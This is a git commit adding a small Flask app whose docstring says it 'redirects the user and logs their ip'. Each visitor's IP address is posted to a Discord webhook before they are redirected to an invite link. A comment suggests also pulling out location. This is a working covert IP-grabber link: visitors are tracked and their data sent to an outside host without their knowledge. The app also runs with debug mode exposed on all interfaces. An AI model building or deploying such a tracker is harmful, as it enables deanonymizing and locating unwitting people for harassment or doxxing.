0ae2e5041db4c074d4f4b5d15553e0ec6bc762d8
ahmedo-o <4664a4664@gmail.com>
2023-03-23 18:52:33 +0400

    initial commit

---
+++ main.py
@@ -0,0 +1,45 @@
+'''
+Redirects the user and logs their ip
+'''
+import os
+import requests
+from dotenv import load_dotenv
+from flask import Flask, request, redirect
+
+app = Flask(__name__)
+INVITE_LINK = os.getenv('INVITE_LINK')
+WEBHOOK_LINK = os.getenv('WEBHOOK_LINK')
+
+
+def post_ip(ip_addr):
+    '''
+    Posts the ip to discord
+    '''
+    embed = {
+        'title': 'Invite IP Log',
+        'fields': [
+            {
+                'name': 'IP',
+                'value': ip_addr
+            }
+        ]
+    }
+    # you can add more like pull out location
+    requests.post(WEBHOOK_LINK, json={'embeds': [embed]}, timeout=10)
+
+
+@app.route('/')
+def invite():
+    '''
+    Logs the visitor's ip, sends it to discord 
+    via webhooks and redirects to the invite link
+    '''
+    ip_addr = request.remote_addr
+    post_ip(ip_addr)
+
+    return redirect(INVITE_LINK)
+
+
+if __name__ == '__main__':
+    load_dotenv()
+    app.run(debug=True, host='0.0.0.0')
